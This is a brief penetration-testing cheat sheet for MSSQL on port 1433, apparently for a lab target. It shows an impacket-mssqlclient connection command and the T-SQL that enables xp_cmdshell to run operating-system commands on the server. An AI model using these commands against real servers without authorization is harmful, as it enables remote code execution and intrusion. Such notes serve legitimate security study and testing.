# Port 1433/tcp
## Stardard usage
 - MSSQL Server
<hr>

#### Establish connection
```bash
impacket-mssqlclient -p 1433 sql_svc@10.10.10.27 -windows-auth
```

#### Enable xp_cmdshell for RCE
```sql
-- this turns on advanced options and is needed to configure xp_cmdshell
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
-- this enables xp_cmdshell
EXEC sp_configure 'xp_cmdshell', '1'
RECONFIGURE

EXEC xp_cmdshell 'dir *.exe';
```